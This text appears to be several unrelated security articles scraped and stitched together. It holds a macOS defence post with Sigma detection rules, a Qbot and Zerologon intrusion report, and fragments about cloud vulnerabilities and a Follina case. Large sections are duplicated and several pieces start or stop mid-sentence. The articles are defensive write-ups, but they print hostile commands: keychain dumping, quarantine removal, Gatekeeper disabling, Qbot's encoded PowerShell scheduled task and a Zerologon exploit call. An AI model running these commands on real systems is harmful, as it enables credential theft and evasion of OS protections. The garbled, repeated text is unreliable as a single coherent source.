container with high severity vulnerabilities Internet exposed Azure VM with RCE vulnerabilities Internet exposed GCP compute instance with RCE vulnerabilities Internet exposed AWS EC2 instance with RCE vulnerabilities Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with \u2018TI map\u2019) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace. If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace.

Although Windows still dominates, second place belongs to macOS. And this makes it a viable target for attackers. With various built-in protection mechanisms, macOS generally provides a pretty much end-to-end security for the end user. This post looks at how some of them work, with examples of common attack vectors and ways of detecting and thwarting them. Overview of macOS security mechanisms Let\u2019s start by outlining the set of security mechanisms in macOS with a brief description of each: Keychain \u2013 default password manager TCC \u2013 application access control SIP \u2013 ensures the integrity of information in directories and processes vulnerable to attacks File Quarantine \u2013 protection against launching suspicious files downloaded from the internet Gatekeeper \u2013 ensures only trusted applications are allowed to run XProtect \u2013 signature-based anti-malware protection in macOS XProtect Remediator \u2013 tool for automatic response to threats detected by XProtect Keychain Introduced back in 1999, the password manager for macOS remains a key component in the Apple security framework. It provides centralized and secure storage of all kinds of secrets: from certificates and encryption keys to passwords and credentials. All user accounts and passwords are stored in Keychain by default. Access to the data is protected by a master password. Keychain files are located in the directories ~/Library/Keychains/ , /Library/Keychains/ and /Network/Library/Keychains/ . Besides the master password, each of them can be protected with its own key. By default, only owners of the corresponding Keychain copy and administrators have access to these files. In addition, the files are encrypted using the reliable AES-256-GCM algorithm. This guarantees a high level of protection, even in the event of physical access to the system. However, attacks on the macOS password manager still occur. There are specialized utilities, such as Chainbreaker, designed to extract data from Keychain files. With access to the file itself and its password, Chainbreaker allows an attacker to do a local analysis and full data decryption without being tied to the victim\u2019s device. What\u2019s more, native macOS tools such as the Keychain Access GUI application or the /usr/bin/security command-line utility can be used for malicious purposes if the system is already compromised. So while the Keychain architecture provides robust protection, it is still vital to control local access, protect the master password, and minimize the risk of data leakage outside the system. Below is an example of a Chainbreaker command: python -m chainbreaker -pa test_keychain.keychain -o output As mentioned above, the security utility can be used for command line management, specifically the following commands: security list-keychains \u2013 displays all available Keychain files Keychain files available to the user security dump-keychain -a -d \u2013 dumps all Keychain files Keychain file dump security dump-keychain ~/Library/Keychains/login.keychain-db \u2013 dumps a specific Keychain file (a user file is shown as an example) To detect attacks of this type, you need to configure logging of process startup events. The best way to do this is with the built-in macOS logging tool, ESF . This allows you to collect necessary events for building detection logic. Collection of necessary events using this mechanism is already implemented and configured in Kaspersky Endpoint Detection and Response (KEDR) . Among the events necessary for detecting the described activity are those containing the security dump-keychain and security list-keychains commands, since such activity is not regular for ordinary macOS users. Below is an example of an EDR triggering on a Keychain dump event, as well as an example of a detection rule. Example of an event from Kaspersky EDR Sigma: title: Keychain access description: This rule detects dumping of keychain tags: - attack.credential-access - attack.t1555.001 logsource: category: process_creation product: macos detection: selection: cmdline: security cmdline: -list-keychains -dump-keychain condition: selection falsepositives: - Unknow level: medium 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 title : Keychain access description : This rule detects dumping of keychain tags : - attack . credential - access - attack . t1555 . 001 logsource : category : process_creation product : macos detection : selection : cmdline : security cmdline : - list - keychains - dump - keychain condition : selection falsepositives : - Unknow level : medium SIP System Integrity Protection (SIP) is one of the most important macOS security mechanisms, which is designed to prevent unauthorized interference in critical system files and processes, even by users with administrative rights. First introduced in OS X 10.11 El Capitan, SIP marked a significant step toward strengthening security by limiting the ability to modify system components, safeguarding against potential malicious influence. The mechanism protects files and directories by assigning special attributes that block content modification for everyone except trusted system processes, which are inaccessible to users and third-party software. In particular, this makes it difficult to inject malicious components into these files. The following directories are SIP-protected by default: /System /sbin /bin /usr (except /usr/local ) /Applications (preinstalled applications) /Library/Application Support/com.apple.TCC A full list of protected directories is in the configuration file /System/Library/Sandbox/rootless.conf . These are primarily system files and preinstalled applications, but SIP allows adding extra paths. SIP provides a high level of protection for system components, but if there is physical access to the system or administrator rights are compromised, SIP can be disabled \u2013 but only by restarting the system in Recovery Mode and then running the csrutil disable command in the terminal. To check the current status of SIP, use the csrutil status command. Output of the csrutil status command To detect this activity, you need to monitor the csrutil status command. Attackers often check the SIP status to find available options. Because they deploy csrutil disable in Recovery Mode before any monitoring solutions are loaded, this command is not logged and so there is no point in tracking its execution. Instead, you can set up SIP status monitoring, and if the status changes, send a security alert. Example of an event from Kaspersky EDR Sigma: title: SIP status discovery description: This rule detects SIP status discovery tags: - attack.discovery - attack.t1518.001 logsource: category: process_creation product: macos detection: selection: cmdline: csrutil status condition: selection falsepositives: - Unknow level: low 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 title : SIP status discovery description : This rule detects SIP status discovery tags : - attack . discovery - attack . t1518 . 001 logsource : category : process_creation product : macos detection : selection : cmdline : csrutil status condition : selection falsepositives : - Unknow level : low TCC macOS includes the Transparency, Consent and Control (TCC) framework, which ensures transparency of applications by requiring explicit user consent to access sensitive data and system functions. TCC is structured on SQLite databases ( TCC.db ), located both in shared directories ( /Library/Application Support/com.apple.TCC/TCC.db ) and in individual user directories ( /Users/<username>/Library/Application Support/com.apple.TCC/TCC.db ). Contents of a table in the TCC database The integrity of these databases and protection against unauthorized access are implemented using SIP, making it impossible to modify them directly. To interfere with these databases, an attacker must either disable SIP or gain access to a trusted system process. This renders TCC highly resistant to interference and manipulation. TCC works as follows: whenever an application accesses a sensitive function (camera, microphone, geolocation, Full Disk Access, input control, etc.) for the first time, an interactive window appears with a request for user confirmation. This allows the user to control the extension of privileges. TCC access permission window A potential vector for bypassing this mechanism is TCC Clickjacking \u2013 a technique that superimposes a visually altered window on top of the permissions request window, hiding the true nature of the request. The unsuspecting user clicks the button and grants permissions to malware. Although this technique does not exploit TCC itself, it gives attackers access to sensitive system functions, regardless of the level of protection. Example of a superimposed window Attackers are interested in obtaining Full Disk Access or Accessibility rights, as these permissions grant virtually unlimited access to the system. Therefore, monitoring changes to TCC.db and managing sensitive privileges remain vital tasks for ensuring comprehensive macOS security. File Quarantine File Quarantine is a built-in macOS security feature, first introduced in OS X 10.5 Tiger. It improves system security when handling files downloaded from external sources. This mechanism is analogous to the Mark-of-the-Web feature in Windows to warn users of potential danger before running a downloaded file. Files downloaded through a browser or other application that works with File Quarantine are assigned a special attribute ( com.apple.quarantine ). When running such a file for the first time, if it has a valid signature and does not arouse any suspicion of Gatekeeper (see below), the user is prompted to confirm the action. This helps prevent running malware by accident. Example of file attributes that include the quarantine attribute To get detailed information about the com.apple.quarantine attribute, use the xattr -p com.apple.quarantine <File name> command. The screenshot below shows an example of the output of this command: 0083 \u2013 flag for further Gatekeeper actions 689cb865 \u2013 timestamp in hexadecimal format (Mac Absolute Time) Safari \u2013 browser used to download the file 66EA7FA5-1F9E-4779-A5B5-9CCA2A4A98F5 \u2013 UUID attached to this file. This is needed to database a record of the file Detailed information about the com.apple.quarantine attribute The information returned by this command is stored in a database located at ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 , where it can be audited. Data in the com.apple.LaunchServices.QuarantineEventsV2 database To avoid having their files quarantined, attackers use various techniques to bypass File Quarantine. For example, files downloaded via curl, wget or other low-level tools that are not integrated with File Quarantine are not flagged with the quarantine attribute. Bypassing quarantine using curl It is also possible to remove the attribute manually using the xattr -d com.apple.quarantine <filename> command. Removing the quarantine attribute If the quarantine attribute is successfully removed, no warning will be displayed when the file is run, which is useful in social engineering attacks or in cases where the attacker prefers to execute malware without the user\u2019s knowledge. Running a file without a File Quarantine check To detect this activity, you need to monitor execution of the xattr command in conjunction with -d and com.apple.quarantine , which implies removal of the quarantine attribute. In an incident related to macOS compromise, also worth investigating is the origin of the file: if it got onto the host without being flagged by quarantine, this is an additional risk factor. Below is an example of an EDR triggering on a quarantine attribute removal event, as well as an example of a rule for detecting such events. Example of an event from Kaspersky EDR Sigma: title: Quarantine attribute removal description: This rule detects removal of the Quarantine attribute, that leads to avoid File Quarantine tags: - attack.defense-evasion - attack.t1553.001 logsource: category: process_creation product: macos detection: selection: cmdline: xattr -d com.apple.quarantine condition: selection falsepositives: - Unknow level: high 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 title : Quarantine attribute removal description : This rule detects removal of the Quarantine attribute , that leads to avoid File Quarantine tags : - attack . defense - evasion - attack . t1553 . 001 logsource : category : process_creation product : macos detection : selection : cmdline : xattr - d com . apple . quarantine condition : selection falsepositives : - Unknow level : high Gatekeeper Gatekeeper is a key part of the macOS security system, designed to protect users from running potentially dangerous applications. First introduced in OS X Leopard (2012), Gatekeeper checks the digital signature of applications and, if the quarantine attribute ( com.apple.quarantine ) is present, restricts the launch of programs unsigned and unapproved by the user, thus reducing the risk of malicious code execution. The spctl utility is used to manage Gatekeeper. Below is an example of calling spctl to check the validity of a signature and whether it is verified by Apple: Spctl -a -t exec -vvvv <path to file> Checking an untrusted file using spctl Checking a trusted file using spctl Gatekeeper requires an application to be: either signed with a valid Apple developer certificate, or certified by Apple after source code verification. If the application fails to meet these requirements, Gatekeeper by default blocks attempts to run it with a double-click. Unblocking is possible, but this requires the user to navigate through the settings. So, to carry out a successful attack, the threat actor has to not only persuade the victim to mark the application as trusted, but also explain to them how to do this. The convoluted procedure to run the software looks suspicious in itself. However, if the launch is done from the context menu (right-click \u2192 Open), the user sees a pop-up window allowing them to bypass the block with a single click by confirming their intention to use the application. This quirk is used in social engineering attacks: malware can be accompanied by instructions prompting the user to run the file from the context menu. Example of Chropex Adware using this technique Let\u2019s take a look at the method for running programs from the context menu, rather than double-clicking. If we double-click the icon of a program with the quarantine attribute, we get the following window. Running a program with the quarantine attribute by double-clicking If we run the program from the context menu (right-click \u2192 Open), we see the following. Running a program with the quarantine attribute from the context menu Attackers with local access and administrator rights can disable Gatekeeper using the spctl \u2013master disable or --global-disable command. To detect this activity, you need to monitor execution of the spctl command with parameters \u2013master disable or --global-disable , which disables Gatekeeper. Below is an example of an EDR triggering on a Gatekeeper disable event, as well as an example of a detection rule. Example of an Kaspersky EDR event Sigma: title: Gatekeeper disable description: This rule detects disabling of Gatekeeper tags: - attack.defense-evasion - attack.t1562.001 logsource: category: process_creation product: macos detection: selection: cmdline: spctl cmdline: - '--master-disable' - '--global-disable' condition: selection 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 title : Gatekeeper disable description : This rule detects disabling of Gatekeeper tags : - attack . defense - evasion - attack . t1562 . 001 logsource : category : process_creation product : macos detection : selection : cmdline : spctl cmdline : - '--master-disable' - '--global-disable' condition : selection Takeaways The built-in macOS protection mechanisms are highly resilient and provide excellent security. That said, as with any mature operating system, attackers continue to adapt and search for ways to bypass even the most reliable protective barriers. In some cases when standard mechanisms are bypassed, it may be difficult to implement additional security measures and stop the attack. Therefore, for total protection against cyberthreats, use advanced solutions from third-party vendors. Our Kaspersky EDR Expert and Kaspersky Endpoint Security detect and block all the threats described in this post. In addition, to guard against bypassing of standard security measures, use the Sigma rules we have provided.

Example of an event from Kaspersky EDR Sigma: title: Quarantine attribute removal description: This rule detects removal of the Quarantine attribute, that leads to avoid File Quarantine tags: - attack.defense-evasion - attack.t1553.001 logsource: category: process_creation product: macos detection: selection: cmdline: xattr -d com.apple.quarantine condition: selection falsepositives: - Unknow level: high 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 title : Quarantine attribute removal description : This rule detects removal of the Quarantine attribute , that leads to avoid File Quarantine tags : - attack . defense - evasion - attack . t1553 . 001 logsource : category : process_creation product : macos detection : selection : cmdline : xattr - d com . apple . quarantine condition : selection falsepositives : - Unknow level : high Gatekeeper Gatekeeper is a key part of the macOS security system, designed to protect users from running potentially dangerous applications. First introduced in OS X Leopard (2012), Gatekeeper checks the digital signature of applications and, if the quarantine attribute ( com.apple.quarantine ) is present, restricts the launch of programs unsigned and unapproved by the user, thus reducing the risk of malicious code execution. The spctl utility is used to manage Gatekeeper. Below is an example of calling spctl to check the validity of a signature and whether it is verified by Apple: Spctl -a -t exec -vvvv <path to file> Checking an untrusted file using spctl Checking a trusted file using spctl Gatekeeper requires an application to be: either signed with a valid Apple developer certificate, or certified by Apple after source code verification. If the application fails to meet these requirements, Gatekeeper by default blocks attempts to run it with a double-click. Unblocking is possible, but this requires the user to navigate through the settings. So, to carry out a successful attack, the threat actor has to not only persuade the victim to mark the application as trusted, but also explain to them how to do this. The convoluted procedure to run the software looks suspicious in itself. However, if the launch is done from the context menu (right-click \u2192 Open), the user sees a pop-up window allowing them to bypass the block with a single click by confirming their intention to use the application. This quirk is used in social engineering attacks: malware can be accompanied by instructions prompting the user to run the file from the context menu. Example of Chropex Adware using this technique Let\u2019s take a look at the method for running programs from the context menu, rather than double-clicking. If we double-click the icon of a program with the quarantine attribute, we get the following window. Running a program with the quarantine attribute by double-clicking If we run the program from the context menu (right-click \u2192 Open), we see the following. Running a program with the quarantine attribute from the context menu Attackers with local access and administrator rights can disable Gatekeeper using the spctl \u2013master disable or --global-disable command. To detect this activity, you need to monitor execution of the spctl command with parameters \u2013master disable or --global-disable , which disables Gatekeeper. Below is an example of an EDR triggering on a Gatekeeper disable event, as well as an example of a detection rule. Example of an Kaspersky EDR event Sigma: title: Gatekeeper disable description: This rule detects disabling of Gatekeeper tags: - attack.defense-evasion - attack.t1562.001 logsource: category: process_creation product: macos detection: selection: cmdline: spctl cmdline: - '--master-disable' - '--global-disable' condition: selection 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 title : Gatekeeper disable description : This rule detects disabling of Gatekeeper tags : - attack . defense - evasion - attack . t1562 . 001 logsource : category : process_creation product : macos detection : selection : cmdline : spctl cmdline : - '--master-disable' - '--global-disable' condition : selection Takeaways The built-in macOS protection mechanisms are highly resilient and provide excellent security. That said, as with any mature operating system, attackers continue to adapt and search for ways to bypass even the most reliable protective barriers. In some cases when standard mechanisms are bypassed, it may be difficult to implement additional security measures and stop the attack. Therefore, for total protection against cyberthreats, use advanced solutions from third-party vendors. Our Kaspersky EDR Expert and Kaspersky Endpoint Security detect and block all the threats described in this post. In addition, to guard against bypassing of standard security measures, use the Sigma rules we have provided.

Quakbot/Qakbot) malware. Soon after execution of the Qbot payload, the malware established C2 connectivity and created persistence on the beachhead. Successful exploitation of the Zerologon vulnerability (CVE-2020-1472) allowed the threat actors to obtain domain admin privileges. This level of access was abused to deploy additional Cobalt Strike beacons and consequently pivot to other sensitive hosts within the network. The threat actor then exfiltrated sensitive documents from the environment before being evicted from the network. Summary The threat actors gained initial access to a Windows workstation through the execution of a malicious DLL. The first activity of QBot was seen 5 minutes after the DLL was executed. Various automated discovery commands were used to map the network topology, retrieve local group member information, and list available file shares/privileges of the infected user. Following the first discovery stage, Qbot dropped another malicious DLL and created a scheduled task to obtain persistence. The scheduled task\u2019s primary purpose was to execute a (base64-encoded) PowerShell Cobalt Strike beacon every 30 minutes. Once the threat actors established persistence, they continued with enumerating the environment by mapping out the Active Directory environment using tools such as N ltest, net and ADFind. Upon the identification of one of the domain controllers, the attackers proceeded to exploit the ZeroLogon vulnerability. The executable used bears striking similarity to the one used in a previous case From Zero to Domain Admin based on command line arguments and the overall execution of the exploit. The executable named cool.exe resets the domain controller password to an empty string, retrieves the Domain Admin password Hash, and installs a service on the DC to reset the DC password so as to not break Active Directory operations. The domain admin hash was then used on the beachhead through an over-pass-the-hash attack . After having domain admin privileges, they proceeded with deploying Cobalt Strike Beacons on a file server and another domain controller, which allowed them to pivot to those servers. Finally, documents were stolen and exfiltrated through Cobalt Strike encrypted C2 channel (HTTPS) . To conclude this case, the threat actors were evicted from the network before they completed any further objectives. Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as QBot, Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here . We also have artifacts and IOCs available from this case such as memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services. Timeline Analysis and reporting completed by @pigerlin & @MetallicHack Reviewed by @ICSNick & @kostastsale Initial Access The threat actor gained their initial access through the execution of a malicious DLL. Traditionally Qbot is delivered via email using malicious documents that then downloads the malicious DLL. In this case, however, the execution started directly from the qbot DLL found here . The execution chain for this QBot infection can be seen below: Execution QBot PowerShell analysis We analyzed the registry path and associated keys that were queried by the scheduled task HKCU:\\SOFTWARE\\Pvoeooxf and discovered that three keys were created containing base64 encoded values. Decoding the values resulted in: 1. Copy of QBot DLL 2. String of QBot C2 IP-addresses separated by a semicolon. 3. Obfuscated PowerShell script that is referenced by the scheduled task. The PowerShell script (triggered by the scheduled task) starts off a chain of events which is illustrated below: When run for the first time, the script creates a new registry key entry in the same path, saving the date of execution. It then verifies upon execution if the creation date key of this registry key is older than 4 hours. Based on the outcome, it will either: (1) retrieve the base64-encoded Qbot payload from the Windows Registry, decode it, save it on the file system and execute it. OR (2) Fetch the QBot payload remotely using one of the active C2 IPs using the Invoke-WebRequest PowerShell module: The PS script contains built-in logic to execute various types of payloads including batch and Visual Basic files. The encoded QBot DLL that was stored in the registry, was dropped in the directory %APPDATA%\\Roaming\\Microsoft\\Fdopitcu . The unsigned DLL, with descriptor Cancel Autoplay 2 was executed using regsvr32.exe Upon execution of this second-stage DLL, various registry keys were created in HKCU\\Software\\Microsoft\\Yerqbqokc. In addition, a new instance of explorer.exe (32-bit) was started and injected into. The registry keys contain eight-character long hex strings for which we believe is part of the malware\u2019s encrypted config . Persistence Scheduled Task/Job \u2013 Scheduled Task On Beachhead The scheduled task created by Qbot was set to run every 30 minutes and executes a base64 encoded payload stored in the Windows Registry. schtasks.exe /Create /F /TN \"{97F2F70B-10D1-4447-A2F3-9B070C86E261}\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\Pvoeooxf).yzbbvhhdypa))) \" /SC MINUTE /MO 30 LogName: Microsoft-Windows-TaskScheduler/Operational EventCode: 106 Message: Task scheduler Task Registered Privilege Escalation Thirty minutes after gaining initial access, the threat actors ran an executable file on the beachhead to exploit CVE-2020-1472, Zerologon. The executable was named \u201ccool.exe\u201d : C:\\Windows\\system32\\cmd.exe /C cool.exe [DC IP ADDRESS] [DOMAIN NAME] Administrator -c \"taskkill /f /im explorer.exe\" Three milliseconds after the Zerologon exploit , an event 4742 \u201cA computer account was changed.\u201d was generated on the targeted Domain Controller. As explained in a detailed blog from CrowdStrike , the ZeroLogon CVE relies on the AES-CFB8 algorithm used with a zero IV : \u201cIn order to use AES-CFB8 securely, a random initialization vector (IV) needs to be generated for every plaintext to be encrypted using the same key. However, the ComputeNetlogonCredential function sets the IV to a fixed value of 16 zero bytes. This results in a cryptographic flaw in which encryption of 8-bytes of zeros could yield a ciphertext of zeros with a probability of 1 in 256. Another implementation issue that allows this attack is that unencrypted Netlogon sessions aren\u2019t rejected by servers (by default). The combination of these two flaws could allow an attacker to completely compromise the authentication, and thus to impersonate a server of their choice.\u201d As we can see on the network captures, a brute-force attack was performed in order to spoof the identity of the domain controller : After the end of the brute force traffic, we can see a single instance where a the exploit has completed successfully. After being successfully authenticated, the DC password was set: The PasswordLastSet field is equal to the TimeCreated field, meaning that the password of the domain controller was successfully updated. We can also see that the SubjectUserName is ANONYMOUS LOGON. A connection was performed from the beachhead to the Domain Controller using the DC account. After authenticating to the DC with the DC account, the threat actors dumped the Domain Admin hash, and then reset the DC password in order to unbreak the Active Directory Domain. The explorer shell was also restarted by the threat actor: Defense Evasion Upon execution of the initial DLL, QBot uses process hollowing to start a suspended instance of explorer.exe (32-bit) and then injects itself into this process. The injected explorer.exe process was used to spawn and inject into additional instances of explorer.exe (32-bit). An example event can be seen below. Source PID 10492 belonging to QBot, injected a DLL into PID 4072 which we discovered was part of Cobalt Strike C2 communication. Over-Pass-the-Hash from Beachhead The threat actor obtained the NTLM hash value of the administrator account through the Zerologon exploit and used over-pass-the-hash to request a TGT from the domain controller. We have seen the use of over-pass-the-hash several times before. For example, our Cobalt Strike Defender Guide covers detection of this technique in more detail. Soon after, a TGT for the administrator account was requested: Discovery QBot initially starts a number of processes to collect information about the affected system. This is part of the \u201cSYSTEM INFO\u201d bot request, as described in a recent article from SecureList . Later, more discovery commands were executed via the Cobalt Strike beacon, which gathered information about the active directory environment. ADFind (renamed in find.exe) used to enumerate computers C:\\redacted\\find.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName On the Domain Controller, the threat actors gathered information about the installed security software through WMI: C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiSpywareProduct GET /value C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH FirewallProduct GET /value Ping was used to verify machines were online ping -n 1 [REDACTED] Lateral Movement Through the creation of Windows services, Cobalt Strike Beacons (psexec_psh function) were deployed on multiple hosts within the environment.

These alerts tell us that data was indeed exfiltrated from the environment. The threat actors were most interested in files concerning financial statements, ransomware reports, and salary data. The C2 channel was encrypted and multiple connections were established with the internal file server. No other traffic was observed for possible exfiltration leading us to the conclusion that the command and control channel was used for the exfiltration. At 17:35 UTC, the Cobalt Strike Beacon was deployed on the File Server. According to the number of connections to the C2 from the File Server per minute, we can conclude that exfiltration was done between 17:52 UTC and 18:00 UTC.

Quakbot/Qakbot) malware. Soon after execution of the Qbot payload, the malware established C2 connectivity and created persistence on the beachhead. Successful exploitation of the Zerologon vulnerability (CVE-2020-1472) allowed the threat actors to obtain domain admin privileges. This level of access was abused to deploy additional Cobalt Strike beacons and consequently pivot to other sensitive hosts within the network. The threat actor then exfiltrated sensitive documents from the environment before being evicted from the network. Summary The threat actors gained initial access to a Windows workstation through the execution of a malicious DLL. The first activity of QBot was seen 5 minutes after the DLL was executed. Various automated discovery commands were used to map the network topology, retrieve local group member information, and list available file shares/privileges of the infected user. Following the first discovery stage, Qbot dropped another malicious DLL and created a scheduled task to obtain persistence. The scheduled task\u2019s primary purpose was to execute a (base64-encoded) PowerShell Cobalt Strike beacon every 30 minutes. Once the threat actors established persistence, they continued with enumerating the environment by mapping out the Active Directory environment using tools such as N ltest, net and ADFind. Upon the identification of one of the domain controllers, the attackers proceeded to exploit the ZeroLogon vulnerability. The executable used bears striking similarity to the one used in a previous case From Zero to Domain Admin based on command line arguments and the overall execution of the exploit. The executable named cool.exe resets the domain controller password to an empty string, retrieves the Domain Admin password Hash, and installs a service on the DC to reset the DC password so as to not break Active Directory operations. The domain admin hash was then used on the beachhead through an over-pass-the-hash attack . After having domain admin privileges, they proceeded with deploying Cobalt Strike Beacons on a file server and another domain controller, which allowed them to pivot to those servers. Finally, documents were stolen and exfiltrated through Cobalt Strike encrypted C2 channel (HTTPS) . To conclude this case, the threat actors were evicted from the network before they completed any further objectives. Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as QBot, Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here . We also have artifacts and IOCs available from this case such as memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services. Timeline Analysis and reporting completed by @pigerlin & @MetallicHack Reviewed by @ICSNick & @kostastsale Initial Access The threat actor gained their initial access through the execution of a malicious DLL. Traditionally Qbot is delivered via email using malicious documents that then downloads the malicious DLL. In this case, however, the execution started directly from the qbot DLL found here . The execution chain for this QBot infection can be seen below: Execution QBot PowerShell analysis We analyzed the registry path and associated keys that were queried by the scheduled task HKCU:\\SOFTWARE\\Pvoeooxf and discovered that three keys were created containing base64 encoded values. Decoding the values resulted in: 1. Copy of QBot DLL 2. String of QBot C2 IP-addresses separated by a semicolon. 3. Obfuscated PowerShell script that is referenced by the scheduled task. The PowerShell script (triggered by the scheduled task) starts off a chain of events which is illustrated below: When run for the first time, the script creates a new registry key entry in the same path, saving the date of execution. It then verifies upon execution if the creation date key of this registry key is older than 4 hours. Based on the outcome, it will either: (1) retrieve the base64-encoded Qbot payload from the Windows Registry, decode it, save it on the file system and execute it. OR (2) Fetch the QBot payload remotely using one of the active C2 IPs using the Invoke-WebRequest PowerShell module: The PS script contains built-in logic to execute various types of payloads including batch and Visual Basic files. The encoded QBot DLL that was stored in the registry, was dropped in the directory %APPDATA%\\Roaming\\Microsoft\\Fdopitcu . The unsigned DLL, with descriptor Cancel Autoplay 2 was executed using regsvr32.exe Upon execution of this second-stage DLL, various registry keys were created in HKCU\\Software\\Microsoft\\Yerqbqokc. In addition, a new instance of explorer.exe (32-bit) was started and injected into. The registry keys contain eight-character long hex strings for which we believe is part of the malware\u2019s encrypted config . Persistence Scheduled Task/Job \u2013 Scheduled Task On Beachhead The scheduled task created by Qbot was set to run every 30 minutes and executes a base64 encoded payload stored in the Windows Registry. schtasks.exe /Create /F /TN \"{97F2F70B-10D1-4447-A2F3-9B070C86E261}\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\Pvoeooxf).yzbbvhhdypa))) \" /SC MINUTE /MO 30 LogName: Microsoft-Windows-TaskScheduler/Operational EventCode: 106 Message: Task scheduler Task Registered Privilege Escalation Thirty minutes after gaining initial access, the threat actors ran an executable file on the beachhead to exploit CVE-2020-1472, Zerologon. The executable was named \u201ccool.exe\u201d : C:\\Windows\\system32\\cmd.exe /C cool.exe [DC IP ADDRESS] [DOMAIN NAME] Administrator -c \"taskkill /f /im explorer.exe\" Three milliseconds after the Zerologon exploit , an event 4742 \u201cA computer account was changed.\u201d was generated on the targeted Domain Controller. As explained in a detailed blog from CrowdStrike , the ZeroLogon CVE relies on the AES-CFB8 algorithm used with a zero IV : \u201cIn order to use AES-CFB8 securely, a random initialization vector (IV) needs to be generated for every plaintext to be encrypted using the same key. However, the ComputeNetlogonCredential function sets the IV to a fixed value of 16 zero bytes. This results in a cryptographic flaw in which encryption of 8-bytes of zeros could yield a ciphertext of zeros with a probability of 1 in 256. Another implementation issue that allows this attack is that unencrypted Netlogon sessions aren\u2019t rejected by servers (by default). The combination of these two flaws could allow an attacker to completely compromise the authentication, and thus to impersonate a server of their choice.\u201d As we can see on the network captures, a brute-force attack was performed in order to spoof the identity of the domain controller : After the end of the brute force traffic, we can see a single instance where a the exploit has completed successfully. After being successfully authenticated, the DC password was set: The PasswordLastSet field is equal to the TimeCreated field, meaning that the password of the domain controller was successfully updated. We can also see that the SubjectUserName is ANONYMOUS LOGON. A connection was performed from the beachhead to the Domain Controller using the DC account. After authenticating to the DC with the DC account, the threat actors dumped the Domain Admin hash, and then reset the DC password in order to unbreak the Active Directory Domain. The explorer shell was also restarted by the threat actor: Defense Evasion Upon execution of the initial DLL, QBot uses process hollowing to start a suspended instance of explorer.exe (32-bit) and then injects itself into this process. The injected explorer.exe process was used to spawn and inject into additional instances of explorer.exe (32-bit). An example event can be seen below. Source PID 10492 belonging to QBot, injected a DLL into PID 4072 which we discovered was part of Cobalt Strike C2 communication. Over-Pass-the-Hash from Beachhead The threat actor obtained the NTLM hash value of the administrator account through the Zerologon exploit and used over-pass-the-hash to request a TGT from the domain controller. We have seen the use of over-pass-the-hash several times before. For example, our Cobalt Strike Defender Guide covers detection of this technique in more detail. Soon after, a TGT for the administrator account was requested: Discovery QBot initially starts a number of processes to collect information about the affected system. This is part of the \u201cSYSTEM INFO\u201d bot request, as described in a recent article from SecureList . Later, more discovery commands were executed via the Cobalt Strike beacon, which gathered information about the active directory environment. ADFind (renamed in find.exe) used to enumerate computers C:\\redacted\\find.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName On the Domain Controller, the threat actors gathered information about the installed security software through WMI: C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiSpywareProduct GET /value C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH FirewallProduct GET /value Ping was used to verify machines were online ping -n 1 [REDACTED] Lateral Movement Through the creation of Windows services, Cobalt Strike Beacons (psexec_psh function) were deployed on multiple hosts within the environment.

These alerts tell us that data was indeed exfiltrated from the environment. The threat actors were most interested in files concerning financial statements, ransomware reports, and salary data. The C2 channel was encrypted and multiple connections were established with the internal file server. No other traffic was observed for possible exfiltration leading us to the conclusion that the command and control channel was used for the exfiltration. At 17:35 UTC, the Cobalt Strike Beacon was deployed on the File Server. According to the number of connections to the C2 from the File Server per minute, we can conclude that exfiltration was done between 17:52 UTC and 18:00 UTC. Spike in traffic from file share server to Cobalt Strike command and control server.

Qbot, also known as Qakbot or Pinksliplot is actively developed and capable of a number of functions from reconnaissance, lateral movement, data exfiltration, to delivering other payloads acting as an initial access broker. Qbot is regarded by US CERT as being one of the 2021 Top Malware Strains in Alert (AA22-216A) . In the past we\u2019ve covered other intrusion cases where Qbot was used as an initial access vector. See our reports titled \u201c Qbot and Zerologon Lead To Full Domain Compromise \u201d and \u201c Qbot Likes to Move It, Move It \u201c. In this intrusion, soon after execution of the Qbot payload, the malware established C2 connectivity and performed discovery activity on the beachhead host. Along the way, the threat actors pivoted to multiple systems and installed remote management tools such as NetSupport and Atera Agent, and utilized the ubiquitous Cobalt Strike for maintaining access to the network. The intrusion lasted 2 days, and the attackers ultimately showed interest in accessing sensitive documents hosted on a file server, after which, they exited the environment. Case Summary In this intrusion, a threat actor abused the CVE-2022-30190 (Follina) vulnerability, where exploit code was embedded inside a malicious Word document to gain initial access. We assess with medium to high confidence that the documents likely arrived by the means of thread-hijacked emails from distribution channels used by TA570 . Upon 